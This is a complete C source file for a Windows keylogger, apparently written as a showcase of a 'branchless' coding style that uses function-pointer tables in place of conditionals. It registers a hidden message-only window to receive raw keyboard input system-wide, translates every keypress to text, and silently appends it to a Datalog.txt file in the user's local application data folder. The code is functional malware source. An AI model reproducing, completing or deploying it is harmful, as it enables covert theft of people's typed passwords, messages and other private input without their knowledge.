#include <Windows.h>
#include <stdio.h>

#define HID_USAGE_PAGE_GENERIC 0x01
#define HID_USAGE_GENERIC_KEYBOARD 0x06

typedef SIZE_T(WINAPI* STRINGLENGTHW)(CONST PWCHAR);
STRINGLENGTHW StringLengthW = NULL;

typedef SIZE_T(WINAPI* STRINGLENGTHA)(CONST PCHAR);
STRINGLENGTHA StringLengthA = NULL;

typedef INT(__cdecl* STRINGFORMATA)(PCHAR Buffer, SIZE_T SizeOfBuffer, CONST CHAR* String, ...);
STRINGFORMATA StringFormatA = NULL;

typedef struct __MESSAGE_HANDLER_STRUCT
{
	HANDLE hHandle;
	RAWINPUTDEVICE RawInputDevice;
	PRAWINPUT Input;
	UINT uSize;
	DWORD ConditionalExpression;
	BYTE Buffer[1028];
}MESSAGE_HANDLER, * PMESSAGE_HANDLER;

typedef LRESULT(*MESSAGE_HANDLE_CALLBACKS)(HWND, UINT, WPARAM, LPARAM, PMESSAGE_HANDLER);

static MESSAGE_HANDLE_CALLBACKS Callback[256];

VOID ZeroMemoryRecursive(PULONG Dest, SIZE_T Count)
{
    Count && (ZeroMemoryRecursive(Dest + 1, Count - 1), *Dest = 0);
}

VOID RecursiveZeroMemoryInvoker(PVOID Destination, SIZE_T Size)
{
    ZeroMemoryRecursive((PULONG)Destination, Size / sizeof(ULONG));
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
    *String1 = *String2;

    (*String2 != 0) && StringCopyW(String1 + 1, String2 + 1);

    return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
    StringCopyW(&String[StringLengthW(String)], String2);

    return String;
}

VOID ConditionalNoOperationRoutine(VOID) {}

VOID ConditionalExitRoutine(VOID)
{
    ExitProcess(GetLastError());
}

VOID(*ExpressionHandler[2])() = { ConditionalExitRoutine, ConditionalNoOperationRoutine };


BOOL CallbackKeySingle(UINT Data, PMESSAGE_HANDLER Handler)
{
    BYTE KeyState[256]; RecursiveZeroMemoryInvoker(&KeyState, sizeof(KeyState));
    CHAR WriteBuffer[1028]; RecursiveZeroMemoryInvoker(&WriteBuffer, sizeof(WriteBuffer));
    WORD wKey;
    DWORD dwWritten = 0;

    Handler->ConditionalExpression = GetKeyboardState(KeyState);
    ExpressionHandler[Handler->ConditionalExpression]();

    ToAscii(Data, MapVirtualKey(Data, 0), KeyState, &wKey, 0);

    StringFormatA(WriteBuffer, 1028, "%c", wKey);

    Handler->ConditionalExpression = WriteFile(Handler->hHandle, WriteBuffer, (DWORD)StringLengthA(WriteBuffer), &dwWritten, NULL);
    ExpressionHandler[Handler->ConditionalExpression]();

	return TRUE;
}

BOOL CallbackKeyString(UINT Data, PMESSAGE_HANDLER Handler)
{
    CHAR WriteBuffer[1028]; RecursiveZeroMemoryInvoker(&WriteBuffer, sizeof(WriteBuffer));
    DWORD dwWritten = 0;
    CHAR SpecialCharacter[32]; RecursiveZeroMemoryInvoker(&SpecialCharacter, sizeof(SpecialCharacter));

    Handler->ConditionalExpression = GetKeyNameTextA(MAKELONG(0, MapVirtualKeyW(Data, 0)), SpecialCharacter, 32);
    Handler->ConditionalExpression = (Handler->ConditionalExpression > 1);
    ExpressionHandler[Handler->ConditionalExpression]();

    StringFormatA(WriteBuffer, 1028, "[%s]", SpecialCharacter);

    Handler->ConditionalExpression = WriteFile(Handler->hHandle, WriteBuffer, (DWORD)StringLengthA(WriteBuffer), &dwWritten, NULL);
    ExpressionHandler[Handler->ConditionalExpression]();

	return TRUE;
}

BOOL CallbackKeyIgnore(UINT Data, PMESSAGE_HANDLER Handler)
{
	return TRUE;
}

BOOL(*KeyHandler[3])(UINT Data, PMESSAGE_HANDLER Handler) = { CallbackKeyIgnore, CallbackKeySingle, CallbackKeyString };

BOOL ProcessKeyStateQueue(PMESSAGE_HANDLER Handler, UINT Key)
{
	BYTE KeyState[256]; RecursiveZeroMemoryInvoker(&KeyState, sizeof(KeyState));
	WORD wKey;

	Handler->ConditionalExpression = GetKeyboardState(KeyState);
	ExpressionHandler[Handler->ConditionalExpression]();

	Handler->ConditionalExpression = ToAscii(Key, MapVirtualKeyW(Key, 0), KeyState, &wKey, 0);
	KeyHandler[Handler->ConditionalExpression](Key, Handler);

	return TRUE;
}

LRESULT WmCreateHandler(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, PMESSAGE_HANDLER Handler)
{
    WCHAR LocalAppDataPath[512]; RecursiveZeroMemoryInvoker(&LocalAppDataPath, sizeof(LocalAppDataPath));

    Handler->RawInputDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;
    Handler->RawInputDevice.usUsage = HID_USAGE_GENERIC_KEYBOARD;
    Handler->RawInputDevice.dwFlags = RIDEV_INPUTSINK;
    Handler->RawInputDevice.hwndTarget = hWnd;

    Handler->ConditionalExpression = RegisterRawInputDevices(&Handler->RawInputDevice, 1, sizeof(RAWINPUTDEVICE));
    ExpressionHandler[Handler->ConditionalExpression]();

    Handler->ConditionalExpression = GetEnvironmentVariableW(L"LOCALAPPDATA", LocalAppDataPath, 512);
    Handler->ConditionalExpression = (Handler->ConditionalExpression > 1);
    ExpressionHandler[Handler->ConditionalExpression]();

    StringConcatW(LocalAppDataPath, (PWCHAR)L"\\Datalog.txt");

    Handler->hHandle = CreateFileW(LocalAppDataPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    Handler->ConditionalExpression = (DWORD)(DWORD64)Handler->hHandle;
    Handler->ConditionalExpression = (Handler->ConditionalExpression > 1);
    ExpressionHandler[Handler->ConditionalExpression]();

    Handler->ConditionalExpression = SetFilePointer(Handler->hHandle, 0, NULL, FILE_END);
    Handler->ConditionalExpression = (Handler->ConditionalExpression > 1);
    ExpressionHandler[Handler->ConditionalExpression]();

    return TRUE;
}

LRESULT WmInputHandler(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, PMESSAGE_HANDLER Handler)
{
    UINT Size = 0;
	
    Handler->ConditionalExpression = GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &Size, sizeof(RAWINPUTHEADER));
    Handler->ConditionalExpression = (Handler->ConditionalExpression > 1);
    ExpressionHandler[Handler->ConditionalExpression]();

    Handler->ConditionalExpression = GetRawInputData((HRAWINPUT)lParam, RID_INPUT, Handler->Buffer, &Size, sizeof(RAWINPUTHEADER));
    Handler->ConditionalExpression = (Handler->ConditionalExpression > 1);
    ExpressionHandler[Handler->ConditionalExpression]();

	Handler->Input = (PRAWINPUT)Handler->Buffer;

	(Handler->Input->header.dwType == RIM_TYPEKEYBOARD && Handler->Input->data.keyboard.Message == WM_KEYDOWN) &&
		ProcessKeyStateQueue(Handler, Handler->Input->data.keyboard.VKey);

    return 1;
}

LRESULT WmDestroyHandler(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, PMESSAGE_HANDLER Handler)
{
    return 1;
}

LRESULT WmDefaultHandler(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, PMESSAGE_HANDLER Handler)
{
    return DefWindowProcW(hWnd, Msg, wParam, lParam);
}


VOID InitializeCallbackRoutines(MESSAGE_HANDLE_CALLBACKS* Callback, MESSAGE_HANDLE_CALLBACKS Handler, SIZE_T Size)
{
    Size && (*Callback = Handler, InitializeCallbackRoutines(Callback + 1, Handler, Size - 1), 0);
}

LRESULT CALLBACK Wndproc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
    static MESSAGE_HANDLER Handler;

    Callback[Msg](hWnd, Msg, wParam, lParam, &Handler);

    return 1;
}

VOID ProcessMessages(VOID)
{
    DWORD ConditionalExpression = ERROR_SUCCESS;
    MSG Msg;
PROCESS_MESSAGE_ROUTINE:

    ConditionalExpression = GetMessageW(&Msg, NULL, 0, 0);
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();

    TranslateMessage(&Msg);
    DispatchMessageW(&Msg);

    goto PROCESS_MESSAGE_ROUTINE;
}

BOOL LoadGlobalFunctions(VOID)
{
    DWORD ConditionalExpression = ERROR_SUCCESS;
    HMODULE Module = NULL;

    Module = GetModuleHandleW(L"ntdll.dll");
    ConditionalExpression = (DWORD)(DWORD_PTR)Module;
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();

#pragma warning( push )
#pragma warning( disable : 6387)
    StringLengthW = (STRINGLENGTHW)GetProcAddress(Module, "wcslen");

    ConditionalExpression = (DWORD)(DWORD_PTR)StringLengthW;
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();

    StringLengthA = (STRINGLENGTHA)GetProcAddress(Module, "strlen");
    ConditionalExpression = (DWORD)(DWORD_PTR)StringLengthA;
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();

    StringFormatA = (STRINGFORMATA)GetProcAddress(Module, "sprintf_s");
    ConditionalExpression = (DWORD)(DWORD_PTR)StringFormatA;
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();
#pragma warning( pop ) 

    return TRUE;
}

INT WINAPI wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR lpCmdLine,
    _In_ INT nShowCmd)
{
    DWORD ConditionalExpression = ERROR_SUCCESS;
    HWND WindowHandle = NULL;
    HMODULE Module = NULL;
    WNDCLASSEXW WndClass; RecursiveZeroMemoryInvoker(&WndClass, sizeof(WndClass));

    ConditionalExpression = LoadGlobalFunctions();
    ExpressionHandler[ConditionalExpression]();

    WndClass.cbSize = sizeof(WNDCLASSEXW);
    WndClass.lpfnWndProc = Wndproc;
    WndClass.hInstance = hInstance;
    WndClass.lpszClassName = L"BranchlessCode";

    InitializeCallbackRoutines(Callback, WmDefaultHandler, 256);

    Callback[WM_NCCREATE] = WmCreateHandler;
    Callback[WM_INPUT] = WmInputHandler;
    Callback[WM_DESTROY] = WmDestroyHandler;

    ConditionalExpression = RegisterClassExW(&WndClass);
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();

    WindowHandle = CreateWindowExW(0, L"BranchlessCode", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
    ConditionalExpression = (DWORD)(DWORD_PTR)WindowHandle;
    ConditionalExpression = (ConditionalExpression > 1);
    ExpressionHandler[ConditionalExpression]();

    ProcessMessages();

    return ERROR_SUCCESS;
}
